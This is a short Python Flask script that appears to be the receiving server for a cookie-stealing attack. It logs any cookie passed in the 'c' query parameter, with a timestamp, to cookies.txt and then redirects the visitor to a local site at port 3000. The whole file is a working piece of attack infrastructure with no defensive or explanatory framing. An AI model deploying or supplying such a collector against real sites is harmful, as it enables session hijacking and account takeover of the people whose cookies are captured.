from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():

    cookie = request.args.get('c')
    with open("cookies.txt", "a") as f:
        f.write(cookie + ' ' + str(datetime.now()) + '\n')

    #redirect user to website
    return redirect("https://127.0.0.1:3000")

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5001)
